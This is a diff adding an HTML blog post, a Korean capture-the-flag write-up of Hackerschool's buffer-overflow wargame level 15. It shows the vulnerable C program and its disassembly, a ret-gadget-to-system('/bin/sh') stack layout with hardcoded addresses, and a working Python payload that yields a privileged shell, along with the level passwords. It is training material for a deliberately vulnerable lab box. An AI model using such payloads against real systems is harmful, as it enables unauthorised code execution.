@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 LEVEL15 (Giant -> Assassin) : No Stack, No RTL</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 LEVEL15 (Giant -&gt; Assassin) : No Stack, No RTL | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 LEVEL15 (Giant -&gt; Assassin) : No Stack, No RTL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = giant pw = one step closer" />
+<meta property="og:description" content="id = giant pw = one step closer" />
+<link rel="canonical" href="http://localhost:4000/2015-11-30/hackerschool-BoF-stage-15/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-30/hackerschool-BoF-stage-15/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-30T21:03:10+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = giant pw = one step closer","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-30/hackerschool-BoF-stage-15/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 LEVEL15 (Giant -&gt; Assassin) : No Stack, No RTL","dateModified":"2015-11-30T21:03:10+09:00","datePublished":"2015-11-30T21:03:10+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-30/hackerschool-BoF-stage-15/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 LEVEL15 (Giant -> Assassin) : No Stack, No RTL</div>
+  <span class="post-date">
+    <time>30 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = giant</li>
+  <li>pw = one step closer</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--assassinc">1. 문제 : assassin.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - assassin
+        - no stack, no RTL
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+       <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+       <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\xbf'</span><span class="p">)</span>
+    <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"stack retbayed you!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\x40'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"library retbayed you, too!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+        <span class="c1">// buffer+sfp hunter
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">44</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="2-공격-준비">2. 공격 준비</h2>
+
+<h3 id="21-공격-방법-고민">2.1 공격 방법 고민</h3>
+
+<p>BoF 를 위한 return address 설정을 stack (0xbf)과 library (0x40)을 이용할 수 없다면… ROP (Return Oriented Programming)을 이용해야할까 ? Gadget은 어디에서 찾아야 하나 ?</p>
+
+<p>잘 모르겠으니 혹시나 실행 파일 assassin의 assembler을 확인해보자.</p>
+
+<h3 id="22-assassin">2.2 assassin()</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>08048470 &lt;main&gt;:
+ 8048470:       55                      push   %ebp
+ 8048471:       89 e5                   mov    %esp,%ebp
+ 8048473:       83 ec 28                sub    $0x28,%esp
+ 8048476:       83 7d 08 01             cmpl   $0x1,0x8(%ebp) 
+ 8048477:       ...
+ 8048515:       e8 7e fe ff ff          call   8048398 &lt;_init+0x90&gt;
+ 804851a:       83 c4 0c                add    $0xc,%esp
+ 804851d:       c9                      leave
+ 804851e:       c3                      ret
+ 804851f:       90                      nop
+</code></pre></div></div>
+
+<p>우리가 현재 필요로한 gadget 은 단순히 stack, library 가 아닌 값으로 jump 한 다음에 다시 stack 으로 돌아오면 되는거다. 즉, LR 주소로 stack, library 을 못 쓰기 때문에 다른쪽으로 한 번 jump 한 다음에 다시 stack 으로 돌아오면 된다. 그렇다면… assassin 프로그램에 있는 ret 으로 jump 한다면 ??? ㅋㅋ</p>
+
+<h3 id="23-stack-구성">2.3 Stack 구성</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ Buffer[40] ][ SFR ][ LR ][ ...]
+= [ Buffer[44] ][ ret() ][ system() ][ exit() ][ /bin/sh ]
+
+- ret()    : 0x0804851e
+- system() : 0x40058ae0
+- exit()   : 0x400391e0
+- /bin/sh  : 0x400fbff9
+</code></pre></div></div>
+
+<h2 id="3-exploit">3 Exploit</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./assassin <span class="s2">"</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*44 + "\x1e\x85\x04\x08" + "\xe0\x8a\x05\x40" + "\xe0\x91\x03\x40" + "\xf9\xbf\x0f\x40"'</span><span class="sb">`</span><span class="s2">"</span>   
+
+à@à@ù¿@
+
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>515<span class="o">(</span>assassin<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>515<span class="o">(</span>assassin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="4-다음-단계-정보">4. 다음 단계 정보</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>515<span class="o">(</span>assassin<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>515<span class="o">(</span>assassin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 515
+pushing me away
+</code></pre></div></div>
+
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
